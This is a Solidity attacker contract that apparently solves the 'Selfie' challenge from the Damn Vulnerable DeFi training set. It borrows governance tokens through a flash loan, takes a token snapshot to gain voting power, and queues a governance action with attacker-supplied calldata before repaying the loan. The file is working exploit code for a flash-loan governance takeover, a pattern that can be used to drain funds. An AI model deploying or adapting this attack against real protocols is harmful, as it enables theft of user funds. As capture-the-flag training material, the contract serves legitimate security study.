// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieAttacker {

    using Address for address;

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    bytes data;

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }


    function setData(bytes memory _data) external {
        data = _data;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        token.snapshot();
        governance.queueAction(address(pool), data, 0 ether);
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        
    }
}